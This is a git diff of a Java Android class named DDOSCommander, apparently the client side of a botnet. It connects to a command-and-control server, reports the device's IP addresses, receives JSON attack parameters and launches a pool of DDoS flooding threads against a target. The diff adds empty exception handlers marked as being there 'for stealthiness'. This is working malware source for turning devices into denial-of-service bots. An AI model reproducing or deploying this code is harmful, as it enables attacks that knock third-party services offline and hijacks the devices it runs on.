@@ -9,7 +9,6 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Inet4Address;
@@ -17,20 +16,22 @@ import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.Socket;
 import java.net.SocketException;
-import java.net.UnknownHostException;
 import java.util.Enumeration;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 import static android.content.Context.WIFI_SERVICE;
 
 public class DDOSCommander implements Runnable {
-
+    private static final String UTF_8 = "UTF-8";
+    private PrintWriter out;
+    private BufferedReader in;
+    private Socket socket;
+    private static final String CNC_SERVER_IP = "10.0.2.2";
+    private static final int CNC_SERVER_PORT = 8888;
     private Context applicationContext;
+
     DDOSCommander(Context applicationContext) {
         this.applicationContext = applicationContext;
     }
@@ -38,71 +39,49 @@ public class DDOSCommander implements Runnable {
     @Override
     public void run() {
         try {
-
-//            ScheduledExecutorService exec = Executors.newSingleThreadScheduledExecutor();
-//            exec.scheduleAtFixedRate(new DDOSCommander(applicationContext), 0, 5, TimeUnit.SECONDS);
-
-            System.out.println("Run thread");
-
-            Socket echoSocket = new Socket("10.0.2.2", 8888);
-            PrintWriter out =
-                    new PrintWriter(echoSocket.getOutputStream(), true);
-            BufferedReader in =
-                    new BufferedReader(
-                            new InputStreamReader(echoSocket.getInputStream(), "UTF-8"));
-            BufferedReader stdIn =
-                    new BufferedReader(
-                            new InputStreamReader(System.in));
+            socket = new Socket(CNC_SERVER_IP, CNC_SERVER_PORT);
+            out = new PrintWriter(socket.getOutputStream(), true);
+            in = new BufferedReader(new InputStreamReader(socket.getInputStream(), UTF_8));
 
             out.println(Base64.encodeToString((getIpV4Addr() + " " + getLocalIpAddress()).getBytes(), Base64.DEFAULT));
             String jsonFromSocket = in.readLine();
 
-            JSONObject obj = new JSONObject(jsonFromSocket);
+            JSONObject jsonParamsObject = new JSONObject(jsonFromSocket);
+            createDdosThreads(jsonParamsObject);
 
-
-            String destinationIp = obj.getString("destinationIp");
-            int duration = obj.getInt("duration");
-            String method = obj.getString("method");
-            String protocol = obj.getString("protocol");
-            String port = obj.getString("port");
-            String url = obj.getString("url");
-            int threads = obj.getInt("threads");
-
-            System.out.println("echo: " + obj.getString("destinationIp"));
-
-
-            // create a pool of threads, 10 max jobs will execute in parallel
-            ExecutorService threadPool = Executors.newFixedThreadPool(threads);
-            // submit jobs to be executing by the pool
-            for (int i = 0; i < threads; i++) {
-                threadPool.submit(new DDOSThread(destinationIp, protocol, port, url, method));
-            }
-
-            // wait for the threads to finish if necessary
-            threadPool.awaitTermination(duration, TimeUnit.SECONDS);
-
-            echoSocket.close();
-            out.close();
-            in.close();
-            stdIn.close();
-            System.out.println("closed all resources");
-        } catch (
-                UnknownHostException e) {
-            System.err.println("Don't know about host " + "10.0.2.2");
-            System.exit(1);
-        } catch (
-                IOException e) {
-            System.err.println("Couldn't get I/O for the connection to " +
-                    "10.0.2.2");
-            System.exit(1);
-        } catch (JSONException e) {
-            e.printStackTrace();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
+        } catch(Exception e){
+            //EMPTY FOR STEALTHINESS PURPOSES
+        } finally {
+            closeResources();
         }
     }
 
+    private void closeResources() {
+        try {
+            socket.close();
+            out.close();
+            in.close();
+        } catch (Exception e) {
+        //EMPTY FOR STEALTHINESS PURPOSES
+        }
 
+    }
+
+    private void createDdosThreads(JSONObject jsonParamsObject) throws JSONException, InterruptedException {
+        String destinationIp = jsonParamsObject.getString("destinationIp");
+        int duration = jsonParamsObject.getInt("duration");
+        String method = jsonParamsObject.getString("method");
+        String protocol = jsonParamsObject.getString("protocol");
+        String port = jsonParamsObject.getString("port");
+        String url = jsonParamsObject.getString("url");
+        int threads = jsonParamsObject.getInt("threads");
+
+        ExecutorService threadPool = Executors.newFixedThreadPool(threads);
+        for (int i = 0; i < threads; i++) {
+            threadPool.submit(new DDOSThread(destinationIp, protocol, port, url, method));
+        }
+        threadPool.awaitTermination(duration, TimeUnit.SECONDS);
+    }
 
 
     private String getIpV4Addr() {
@@ -110,7 +89,7 @@ public class DDOSCommander implements Runnable {
         return Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
     }
 
-    public static String getLocalIpAddress() {
+    private static String getLocalIpAddress() {
         try {
             for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                 NetworkInterface intf = en.nextElement();
@@ -121,9 +100,7 @@ public class DDOSCommander implements Runnable {
                     }
                 }
             }
-        } catch (SocketException ex) {
-            ex.printStackTrace();
-        }
-        return null;
+        } catch (SocketException ex) { }
+        return "";
     }
 }
